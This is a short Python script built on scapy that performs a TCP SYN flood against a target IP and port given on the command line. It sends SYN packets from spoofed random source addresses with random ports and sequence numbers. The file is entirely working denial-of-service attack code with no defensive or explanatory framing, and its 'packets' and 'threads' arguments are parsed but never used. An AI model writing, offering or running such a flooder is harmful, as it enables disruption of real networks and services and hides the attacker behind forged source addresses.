#!/usr/bin/env python3

import argparse
import random
import sys

import socket

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send, sendp

# Default values #
DEFAULT_PACK = 999999999
MAX_PORTS = 65535


def random_IP():
    IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return IP


def assign_args():
    target_ip = sys.argv[1]
    dPort = int(sys.argv[2])
    packets = int(sys.argv[3])
    threads = int(sys.argv[4])
    loop = int(sys.argv[5])

    return target_ip, dPort, packets, threads, loop


def SYN_flood(ip, dPort, packets_to_send, threads, loop):
    print("executing SYN Flooder with the following configurations"
          + "\nsource ip: " + socket.gethostbyname(socket.gethostname())
          + "\ntarget_ip: " + ip
          + "\ndPort: " + str(dPort)
          + "\ntotal packets to send: " + str(packets_to_send)
          + "\nthreads: " + str(threads)
          + "\nloop: " + str(loop))

    for i in range(loop):
        seq_n = random.randint(0, MAX_PORTS)
        sPort = random.randint(0, MAX_PORTS)
        Window = random.randint(0, MAX_PORTS)

        src_ip = random_IP()

        packet = IP(dst=ip, src=src_ip) / TCP(sport=sPort, dport=dPort, flags="S", seq=seq_n, window=Window)
        send(packet, verbose=0)

        print("[" + str(i + 1) + "] sending " + str(packet))


def main():
    ip, port, packets, threadsCount, loop = assign_args()
    SYN_flood(ip=ip, dPort=port, packets_to_send=packets, threads=threadsCount, loop=loop)


if __name__ == "__main__":
    main()
